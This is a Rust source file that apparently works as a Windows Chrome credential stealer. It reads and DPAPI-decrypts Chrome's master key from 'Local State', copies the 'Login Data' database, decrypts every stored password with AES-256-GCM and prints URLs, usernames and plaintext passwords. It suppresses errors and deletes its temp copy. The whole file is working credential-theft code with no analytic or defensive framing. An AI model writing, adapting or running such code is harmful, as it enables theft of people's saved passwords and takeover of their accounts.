use aes_gcm::{Aes256Gcm, Nonce, Key};
use aes_gcm::aead::{Aead, NewAead};
use serde_json as json;
use std::path;
use std::ptr;
use sqlite;
use windows::Win32::{
    Security::Cryptography::{CryptUnprotectData, CRYPTOAPI_BLOB},
    System::Memory::LocalFree,
};

fn main() {
    unsafe {
        let e = || -> Result<(), Box<dyn std::error::Error>> {
            let mut key = read_master_key()?;
            let master_key = decrypt_master_key(&mut key)?;
            sqlite_shit(&master_key)?;
            Ok(())
        };
        if let Err(_) = e() {}
        std::fs::remove_file("vault_copy.db").unwrap_or_default();
        std::process::exit(0);

    };
}

fn read_master_key() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let home_folder = std::env::var("USERPROFILE")?;
    let mut local_state_path = path::PathBuf::from(home_folder);
    local_state_path.push(r"AppData\Local\Google\Chrome\User Data\Local State");

    let local_state = std::fs::read_to_string(local_state_path)?;
    let v: json::Value = json::from_str(&local_state)?;
    let key = &v["os_crypt"]["encrypted_key"];
    let secret_key_base64 = key.as_str().unwrap_or_default();

    let secret_key = base64
            ::decode(secret_key_base64)?[5..]
            .to_vec();

    Ok(secret_key)
}

// https://stackoverflow.com/questions/65969779/rust-ffi-with-windows-cryptounprotectdata
unsafe fn decrypt_master_key(et_bytes: &mut Vec<u8>) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let size = u32::try_from(et_bytes.len())?;

    let mut p_data_in = CRYPTOAPI_BLOB {
        cbData: size,
        pbData: et_bytes.as_mut_ptr(),
    };
    let mut p_data_out = CRYPTOAPI_BLOB::default();

    let pin = &mut p_data_in;
    let pout = &mut p_data_out;

    CryptUnprotectData(
        pin,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        pout,
    );

    if !p_data_out.pbData.is_null() {
        let output = std::slice::from_raw_parts(p_data_out.pbData, p_data_out.cbData as _);

        LocalFree(p_data_out.pbData as _);

        Ok(output.to_vec())
    } else {
        std::process::exit(0);
    }
}

fn sqlite_shit(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
    let home_folder = std::env::var("USERPROFILE")?;
    let mut login_data_path = path::PathBuf::from(home_folder);
    login_data_path.push(r"AppData\Local\Google\Chrome\User Data\default\Login Data");
    let temp_path = "vault_copy.db";
    std::fs::copy(login_data_path, temp_path)?;

    let conn = sqlite::open(temp_path)?;
    let mut statement = conn
                .prepare("SELECT action_url, username_value, password_value FROM logins;")
                ?;

    let headers = "URL; Username; Password";
    println!("{text}\n{len}", text=headers, len="-".repeat(headers.len()));
    while let sqlite::State::Row = statement.next()? {
        let action_url = statement.read::<String>(0)?;
        let username_value = statement.read::<String>(1)?;
        let password_value = statement.read::<Vec<u8>>(2)?;

        let decrypted_pass = decyrpt_password(&password_value, &key)
                                    .unwrap_or(
                                        "<couldn't decrypt password>"
                                        .as_bytes()
                                        .to_vec()
                                    );
        println!("{}; {}; {}", action_url, username_value, String::from_utf8(decrypted_pass)?);
    }

    Ok(())
}

fn decyrpt_password(password: &Vec<u8>, key: &Vec<u8>) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let iv = &password[3..15];
    let payload = &password[15..];

    let nonce = Nonce::from_slice(iv);
    let aes_key = Key::from_slice(key);
    let cipher = Aes256Gcm::new(aes_key);

    let plaintext = cipher.decrypt(nonce, payload).or(Err(""))?;
    Ok(plaintext)
}
